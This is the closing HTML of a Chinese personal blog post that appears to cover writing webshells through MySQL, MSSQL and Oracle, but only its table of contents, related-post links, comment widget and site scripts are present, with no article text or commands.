+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Sql/">Sql</a></div><div class="post_share"><div class="social-share" data-image="/img/backup.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/js/social-share.min.css" media="print" onload="this.media='all'"><script src="/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/81744c33.html"><img class="prev-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">个人备忘录(加密版)</div></div></a></div><div class="next-post pull-right"><a href="/posts/4fdc8cf6.html"><img class="next-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">个人备忘录007</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3e95d273.html" title="MySQL写马详解"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">MySQL写马详解</div></div></a></div><div><a href="/posts/d09cc855.html" title="mysql基础命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">mysql基础命令</div></div></a></div><div><a href="/posts/7b6ed634.html" title="Sql 注入总结"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">Sql 注入总结</div></div></a></div><div><a href="/posts/3e5ae1f5.html" title="sqlmap的基础使用"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">sqlmap的基础使用</div></div></a></div><div><a href="/posts/78ff19ec.html" title="一次没有逗号的MSSQL注入"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">一次没有逗号的MSSQL注入</div></div></a></div><div><a href="/posts/8ba4b8c2.html" title="记录sql注入的发现技巧"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-28</div><div class="title">记录sql注入的发现技巧</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql"><span class="toc-number">1.</span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">基本条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%86%99%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">日志写马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.2.3.</span> <span class="toc-text">实践</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.4.</span> <span class="toc-text">相关命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-into-outfile%E6%B3%A8%E5%B0%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">mysql into outfile注射一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">实践</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mssql"><span class="toc-number">2.</span> <span class="toc-text">Mssql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">2.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">写入webshell方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8XP-cmdshel%E5%86%99%E5%85%A5Webshell"><span class="toc-number">2.3.</span> <span class="toc-text">使用XP_cmdshel写入Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E5%86%99%E5%85%A5WebShell"><span class="toc-number">2.4.</span> <span class="toc-text">使用差异备份写入WebShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8log%E5%A4%87%E4%BB%BD%E5%86%99%E5%85%A5WebShell"><span class="toc-number">2.5.</span> <span class="toc-text">使用log备份写入WebShell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ORACLE"><span class="toc-number">3.</span> <span class="toc-text">ORACLE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-3"><span class="toc-number">3.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E5%86%99%E5%85%A5webshell"><span class="toc-number">3.2.</span> <span class="toc-text">Oracle写入webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/backup.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Fstraw</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ccc-f.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/fancybox.umd.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="/js/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>var requestSetting = function (from,set) {
+    var from = from
+    var setting = set.split(',').filter(function(item){
+    return from.indexOf(item) > -1
+    });
+    setting = setting.length == 0 ? from :setting;
+    return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'')
+var requiredFields = requestSetting(['nick','mail'],'nick,mail')
+function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      master:'7f26fd285f1e832baef86f5bcaadd06a',
+      pageSize:'10',
+      lang:'zh-CN',
+      placeholder:'建议使用QQ邮箱,评论头像采用QQ头像',
+      recordIP:'true',
+      enableQQ:'true',
+      requiredFields: requiredFields,
+      appId: '9xmgN7UpSgxN7k2zu16HHcl6-gzGzoHsz',
+      appKey: '6t7uQFgue7owtGg4R7ieIYWu',
+      avatar: 'monsterid',
+      serverURLs: 'https://9xmgn7up.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('/js/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="/js/fireworks.min.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>((window.gitter = {}).chat = {}).options = {
+  disableDefaultChat: true,
+};
+document.addEventListener('gitter-sidecar-ready', (e) => {
+  const GitterChat = e.detail.Chat
+  let chat
+
+  function initGitter () {
+    chat = new GitterChat({
+      room: 'blogroom/test',
+      activationElement: '#chat_btn'
+    });
+  }
+
+  initGitter()
+
+  if (false) {
+    document.addEventListener('pjax:complete', () => {
+      chat.destroy()
+      initGitter()
+    })
+  }
+
+})</script><script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async="async" defer="defer"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
